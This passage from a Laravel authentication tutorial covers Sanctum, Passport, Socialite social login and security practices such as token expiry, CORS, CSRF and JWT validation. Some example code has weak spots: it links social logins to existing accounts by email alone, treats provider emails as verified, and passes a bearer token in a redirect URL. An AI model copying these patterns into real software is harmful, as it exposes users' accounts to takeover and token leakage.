  - If cookies are not possible, store tokens in memory (JavaScript variable).
  - Use a "silent refresh" or "token refresh" iframe to re-obtain tokens.
  - localStorage is acceptable only with strong XSS prevention (Content Security Policy, input sanitization).

In short: httpOnly cookies are the safest option for web apps. localStorage and sessionStorage are convenient but vulnerable to XSS. Always protect against both XSS and CSRF regardless of your storage choice.

---

## 11. Laravel Sanctum vs Laravel Passport

### Laravel Sanctum

- **What it is:**
  - A lightweight authentication package for SPAs, mobile apps, and simple token-based APIs.
  - Part of the official Laravel ecosystem.

- **Key features:**
  - **SPA Authentication:** Cookie-based session authentication for same-domain SPAs.
  - **API Tokens:** Simple token-based authentication for mobile apps and third-party integrations.
  - Tokens are stored as hashed values in the database.
  - Supports token abilities (scopes).
  - No OAuth complexity -- just simple token issuance.

- **When to use Sanctum:**
  - Your SPA and API are on the same top-level domain.
  - You need simple API tokens for mobile apps.
  - You do not need full OAuth 2.0 (authorization codes, third-party client management).
  - You want a lightweight solution with minimal setup.
  - Building a first-party application only.

```php
// Install Sanctum
// composer require laravel/sanctum
// php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
// php artisan migrate

// Issue a token
$token = $user->createToken('mobile-app', ['read-posts', 'create-posts']);
return response()->json(['token' => $token->plainTextToken]);

// Protect routes
Route::middleware('auth:sanctum')->group(function () {
    Route::get('/user', function (Request $request) {
        return $request->user();
    });
});

// Check token abilities
if ($user->tokenCan('create-posts')) {
    // User's token has this ability
}

// Revoke tokens
$user->currentAccessToken()->delete();  // Revoke current
$user->tokens()->delete();              // Revoke all
```

```php
// SPA Authentication with Sanctum (cookie-based)
// config/sanctum.php
'stateful' => explode(',', env(
    'SANCTUM_STATEFUL_DOMAINS',
    'localhost,localhost:3000,127.0.0.1,your-spa.com'
)),

// In your SPA (Axios example):
// Step 1: Get CSRF cookie
axios.get('/sanctum/csrf-cookie');

// Step 2: Login (cookie is set automatically)
axios.post('/login', { email, password });

// Step 3: Make authenticated requests (cookie sent automatically)
axios.get('/api/user');
```

### Laravel Passport

- **What it is:**
  - A full OAuth 2.0 server implementation for Laravel.
  - Built on top of the League OAuth 2.0 Server.

- **Key features:**
  - Full OAuth 2.0 support (Authorization Code, Client Credentials, Password, PKCE).
  - Third-party client management (issue client IDs and secrets).
  - Scope-based authorization.
  - Personal access tokens.
  - Issues JWTs as access tokens.
  - Token revocation and refresh token support.

- **When to use Passport:**
  - You need a full OAuth 2.0 server (your app is the authorization provider).
  - Third-party applications need to authenticate against your API.
  - You need the Authorization Code flow with redirects.
  - You need client credentials for machine-to-machine communication.
  - Building a platform where others build apps on top of your API (like GitHub or Google).

```php
// Install Passport
// composer require laravel/passport
// php artisan passport:install

// User model
use Laravel\Passport\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens;
}

// config/auth.php
'guards' => [
    'api' => [
        'driver' => 'passport',
        'provider' => 'users',
    ],
],

// Issue personal access token
$token = $user->createToken('Personal Token', ['read-posts'])->accessToken;

// Protect routes
Route::middleware('auth:api')->group(function () {
    Route::get('/user', fn(Request $request) => $request->user());
});

// Scope-based middleware
Route::middleware(['auth:api', 'scope:create-posts'])->post('/posts', ...);
```

```php
// Passport - Client Credentials (machine-to-machine)
// Register a client: php artisan passport:client --client

Route::middleware('client:read-orders')->get('/api/orders', function () {
    return Order::all();
});

// The calling service authenticates:
$response = Http::asForm()->post('https://your-app.com/oauth/token', [
    'grant_type' => 'client_credentials',
    'client_id' => 'client-id',
    'client_secret' => 'client-secret',
    'scope' => 'read-orders',
]);
```

### Comparison

- **Complexity:**
  - Sanctum: Simple, minimal setup.
  - Passport: Complex, full OAuth 2.0 server with many moving parts.

- **Token type:**
  - Sanctum: Opaque database tokens (SPA uses sessions/cookies).
  - Passport: JWTs (self-contained tokens).

- **OAuth 2.0 support:**
  - Sanctum: No OAuth flows. Simple token issuance only.
  - Passport: Full OAuth 2.0 (Authorization Code, Client Credentials, PKCE, etc.).

- **Third-party clients:**
  - Sanctum: Not designed for third-party client management.
  - Passport: Built for managing third-party clients with client IDs and secrets.

- **Best for:**
  - Sanctum: First-party SPAs, mobile apps, simple APIs.
  - Passport: Platforms with third-party integrations, OAuth providers.

- **Performance:**
  - Sanctum: Slightly faster (simple DB lookup or session check).
  - Passport: Slightly slower (JWT verification, more complex token handling).

- **Rule of thumb:** If you are not sure which to use, start with **Sanctum**. Only use Passport when you specifically need OAuth 2.0 server capabilities.

In short: Sanctum is lightweight and perfect for first-party apps. Passport is a full OAuth 2.0 server for when third-party apps need to authenticate against your API. Use Sanctum unless you explicitly need OAuth 2.0.

---

## 12. Social Login (Laravel Socialite)

- **Laravel Socialite** is an official package that simplifies OAuth authentication with popular providers like Google, GitHub, Facebook, Twitter, and more.
- It handles the entire OAuth flow (redirect, callback, token exchange, user info retrieval).
- You do not need to manually build the OAuth flow from section 6 -- Socialite does it for you.

### Setup

```bash
composer require laravel/socialite
```

```php
// config/services.php
'google' => [
    'client_id' => env('GOOGLE_CLIENT_ID'),
    'client_secret' => env('GOOGLE_CLIENT_SECRET'),
    'redirect' => env('GOOGLE_REDIRECT_URI', '/auth/google/callback'),
],

'github' => [
    'client_id' => env('GITHUB_CLIENT_ID'),
    'client_secret' => env('GITHUB_CLIENT_SECRET'),
    'redirect' => env('GITHUB_REDIRECT_URI', '/auth/github/callback'),
],

'facebook' => [
    'client_id' => env('FACEBOOK_CLIENT_ID'),
    'client_secret' => env('FACEBOOK_CLIENT_SECRET'),
    'redirect' => env('FACEBOOK_REDIRECT_URI', '/auth/facebook/callback'),
],
```

```env
# .env
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
GOOGLE_REDIRECT_URI=https://your-app.com/auth/google/callback

GITHUB_CLIENT_ID=your-github-client-id
GITHUB_CLIENT_SECRET=your-github-client-secret
GITHUB_REDIRECT_URI=https://your-app.com/auth/github/callback
```

### Migration for Social Accounts

```php
// Add to users migration or create a new migration
Schema::table('users', function (Blueprint $table) {
    $table->string('password')->nullable()->change(); // Social users may not have a password
    $table->string('avatar')->nullable();
});

// Separate social accounts table (supports multiple providers per user)
Schema::create('social_accounts', function (Blueprint $table) {
    $table->id();
    $table->foreignId('user_id')->constrained()->onDelete('cascade');
    $table->string('provider');         // google, github, facebook
    $table->string('provider_id');      // The user's ID at the provider
    $table->string('provider_token')->nullable();
    $table->string('provider_refresh_token')->nullable();
    $table->timestamps();

    $table->unique(['provider', 'provider_id']);
});
```

### Controller Implementation

```php
// routes/web.php
Route::get('/auth/{provider}', [SocialAuthController::class, 'redirect'])
    ->whereIn('provider', ['google', 'github', 'facebook']);

Route::get('/auth/{provider}/callback', [SocialAuthController::class, 'callback'])
    ->whereIn('provider', ['google', 'github', 'facebook']);
```

```php
// app/Http/Controllers/SocialAuthController.php
use Laravel\Socialite\Facades\Socialite;

class SocialAuthController extends Controller
{
    // Step 1: Redirect to the provider
    public function redirect(string $provider)
    {
        return Socialite::driver($provider)->redirect();
    }

    // Step 2: Handle the callback
    public function callback(string $provider)
    {
        try {
            $socialUser = Socialite::driver($provider)->user();
        } catch (\Exception $e) {
            return redirect('/login')->with('error', 'Social login failed. Please try again.');
        }

        // Find existing social account
        $socialAccount = SocialAccount::where('provider', $provider)
            ->where('provider_id', $socialUser->getId())
            ->first();

        if ($socialAccount) {
            // Existing social account -- log the user in
            Auth::login($socialAccount->user);
            return redirect('/dashboard');
        }

        // Check if a user with this email already exists
        $existingUser = User::where('email', $socialUser->getEmail())->first();

        if ($existingUser) {
            // Link the social account to the existing user
            $this->createSocialAccount($existingUser, $provider, $socialUser);
            Auth::login($existingUser);
            return redirect('/dashboard');
        }

        // Create a brand new user
        $newUser = User::create([
            'name' => $socialUser->getName(),
            'email' => $socialUser->getEmail(),
            'avatar' => $socialUser->getAvatar(),
            'email_verified_at' => now(), // Social emails are pre-verified
        ]);

        $this->createSocialAccount($newUser, $provider, $socialUser);

        Auth::login($newUser);

        return redirect('/dashboard');
    }

    private function createSocialAccount(User $user, string $provider, $socialUser): void
    {
        SocialAccount::create([
            'user_id' => $user->id,
            'provider' => $provider,
            'provider_id' => $socialUser->getId(),
            'provider_token' => $socialUser->token,
            'provider_refresh_token' => $socialUser->refreshToken,
        ]);
    }
}
```

### Socialite User Object

- **What you get back from `Socialite::driver($provider)->user()`:**
  - `$socialUser->getId()` -- unique ID from the provider.
  - `$socialUser->getName()` -- user's full name.
  - `$socialUser->getEmail()` -- user's email address.
  - `$socialUser->getAvatar()` -- URL to the profile picture.
  - `$socialUser->token` -- the OAuth access token.
  - `$socialUser->refreshToken` -- the OAuth refresh token (if available).
  - `$socialUser->expiresIn` -- token expiry time in seconds.

### Requesting Additional Scopes

```php
// Google - request additional permissions
return Socialite::driver('google')
    ->scopes(['read-contacts', 'read-calendar'])
    ->with(['access_type' => 'offline', 'prompt' => 'consent'])
    ->redirect();

// GitHub - request additional permissions
return Socialite::driver('github')
    ->scopes(['user:email', 'repo'])
    ->redirect();
```

### Socialite for API/SPA (Stateless)

```php
// For SPAs/APIs -- use stateless mode (no session needed)
public function callback(string $provider)
{
    $socialUser = Socialite::driver($provider)->stateless()->user();

    // ... find or create user ...

    // Return a JWT or Sanctum token instead of setting a session
    $token = $user->createToken('social-login')->plainTextToken;

    // Redirect to SPA with token
    return redirect(config('app.frontend_url') . '/auth/callback?token=' . $token);
}
```

In short: Laravel Socialite abstracts the entire OAuth flow for social login. It supports Google, GitHub, Facebook, and many more providers. Use a separate `social_accounts` table to support multiple providers per user.

---

## 13. Security Best Practices

### Token Expiry

- **Always set short expiration times for access tokens:**
  - Access tokens: 15 minutes to 1 hour.
  - Refresh tokens: 7 to 30 days.
  - ID tokens: same as access tokens.
- Short-lived tokens limit the damage window if a token is stolen.
- Use refresh tokens to maintain the user session without re-authentication.
- Never issue access tokens that never expire.

```php
// Good: short-lived access token
$payload = [
    'sub' => $user->id,
    'iat' => time(),
    'exp' => time() + (15 * 60), // 15 minutes
];

// Bad: extremely long-lived access token
$payload = [
    'sub' => $user->id,
    'iat' => time(),
    'exp' => time() + (365 * 24 * 3600), // 1 year -- too long!
];
```

### HTTPS Everywhere

- **Always use HTTPS in production:**
  - Tokens sent over HTTP can be intercepted by anyone on the network (man-in-the-middle attack).
  - Set the `Secure` flag on cookies so they are only sent over HTTPS.
  - Force HTTPS redirects in your web server and Laravel.
  - OAuth providers require HTTPS redirect URIs in production.

```php
// Force HTTPS in Laravel
// app/Providers/AppServiceProvider.php
public function boot()
{
    if (app()->environment('production')) {
        URL::forceScheme('https');
    }
}

// .env
APP_URL=https://your-app.com

// Nginx config
server {
    listen 80;
    server_name your-app.com;
    return 301 https://$server_name$request_uri;
}
```

### CORS (Cross-Origin Resource Sharing)

- **CORS controls which domains can make requests to your API.**
- Restrict allowed origins to your known frontend domains only.
- Never use `*` (wildcard) for authenticated endpoints.
- Configure CORS headers properly in Laravel.

```php
// config/cors.php
return [
    'paths' => ['api/*', 'sanctum/csrf-cookie'],

    'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],

    'allowed_origins' => [
        'https://your-spa.com',
        'https://admin.your-app.com',
        // NOT '*' for authenticated endpoints
    ],

    'allowed_origins_patterns' => [],

    'allowed_headers' => ['Content-Type', 'Authorization', 'X-Requested-With', 'X-XSRF-TOKEN'],

    'exposed_headers' => [],

    'max_age' => 86400, // Cache preflight for 24 hours

    'supports_credentials' => true, // Required for cookies/authentication
];
```

### CSRF Protection with Tokens

- **When using cookie-based authentication (sessions, Sanctum SPA):**
  - CSRF protection is essential because cookies are sent automatically.
  - Laravel includes CSRF protection by default for web routes.
  - Sanctum uses the `X-XSRF-TOKEN` header for SPA authentication.

- **When using Bearer token authentication (Authorization header):**
  - CSRF is generally not a concern because the token is NOT sent automatically.
  - The attacker's forged request will not include the Authorization header.
  - However, if you also use cookies, you still need CSRF protection.

```php
// Sanctum SPA - CSRF protection flow
// 1. SPA requests the CSRF cookie
axios.get('/sanctum/csrf-cookie').then(() => {
    // 2. Laravel sets an XSRF-TOKEN cookie (readable by JS, NOT httpOnly)
    // 3. Axios automatically reads it and sends it as X-XSRF-TOKEN header
    // 4. Laravel verifies the header matches the cookie

    axios.post('/api/posts', { title: 'New Post' });
    // Axios sends: X-XSRF-TOKEN: <value from cookie>
});
```

### Additional Best Practices

- **Validate JWTs properly:**
  - Always verify the signature.
  - Check the `exp` (expiration) claim.
  - Check the `iss` (issuer) claim matches your expected issuer.
  - Check the `aud` (audience) claim matches your client ID.
  - Reject tokens with `alg: none` (the "none" algorithm attack).

```php
// Proper JWT validation
try {
    $decoded = JWT::decode($token, new Key($secret, 'HS256'));

    // Additional validations
    if ($decoded->iss !== config('app.url')) {
        throw new \Exception('Invalid issuer');
    }

    if ($decoded->aud !== config('app.client_id')) {
        throw new \Exception('Invalid audience');
    }
} catch (ExpiredException $e) {
    return response()->json(['error' => 'Token expired'], 401);
} catch (SignatureInvalidException $e) {
    return response()->json(['error' => 'Invalid signature'], 401);
} catch (\Exception $e) {
    return response()->json(['error' => 'Invalid token'], 401);
}
```

- **Use strong secrets:**
  - JWT signing secrets should be at least 256 bits (32 bytes) for HS256.
  - Use `openssl rand -base64 32` to generate strong secrets.
  - Store secrets in `.env`, never in code.
  - Rotate secrets periodically.

- **Implement rate limiting on auth endpoints:**
  - Prevent brute force attacks on login, token refresh, and password reset.

```php
// routes/api.php
Route::middleware('throttle:5,1')->group(function () {
    Route::post('/login', [AuthController::class, 'login']);       // 5 attempts per minute
    Route::post('/refresh', [TokenController::class, 'refresh']);
    Route::post('/forgot-password', [PasswordController::class, 'forgot']);
});
```

- **Log authentication events:**
  - Log successful and failed login attempts.
  - Log token refresh events and token revocations.
  - Monitor for unusual patterns (many failed logins, logins from new locations).

```php
// Logging authentication events
class AuthController extends Controller
{
    public function login(Request $request)
    {
        if (!Auth::attempt($credentials)) {
            Log::warning('Failed login attempt', [
                'email' => $request->email,
                'ip' => $request->ip(),
                'user_agent' => $request->userAgent(),
            ]);

            return response()->json(['error' => 'Invalid credentials'], 401);
        }

        Log::info('Successful login', [
            'user_id' => Auth::id(),
            'ip' => $request->ip(),
        ]);

        // ... issue tokens ...
    }
}
```

- **Implement token blacklisting for critical operations:**
  - When a user changes their password, revoke all existing tokens.
  - When a user is banned or deleted, revoke all tokens immediately.
  - Use Redis or a database table to maintain a blacklist for JWTs.

```php
// Token blacklist using Redis
class TokenBlacklist
{
    public function blacklist(string $tokenId, int $expiresAt): void
    {
        $ttl = $expiresAt - time();

        if ($ttl > 0) {
            Redis::setex("blacklist:{$tokenId}", $ttl, true);
        }
    }

    public function isBlacklisted(string $tokenId): bool
    {
        return (bool) Redis::get("blacklist:{$tokenId}");
    }
}

// In your JWT middleware
$decoded = JWT::decode($token, new Key($secret, 'HS256'));

if ($this->blacklist->isBlacklisted($decoded->jti)) {
    return response()->json(['error' => 'Token has been revoked'], 401);
}
```

- **Use the `state` parameter in OAuth flows:**
  - Always include a random `state` value in OAuth authorization requests.
  - Verify it in the callback to prevent CSRF attacks on the OAuth flow.
  - This prevents attackers from tricking users into linking the attacker's account.

- **Content Security Policy (CSP):**
  - Implement CSP headers to prevent XSS attacks that could steal tokens.
  - Restrict script sources to trusted domains only.

```php
// Middleware for Content Security Policy
class ContentSecurityPolicy
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        $response->headers->set(
            'Content-Security-Policy',
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
        );

        return $response;
    }
}
```

In short: Use short-lived tokens, enforce HTTPS, configure CORS strictly, protect against CSRF when using cookies, validate JWTs thoroughly, rate limit auth endpoints, log all auth events, and implement token blacklisting for revocation. Security is layered -- no single measure is enough on its own.
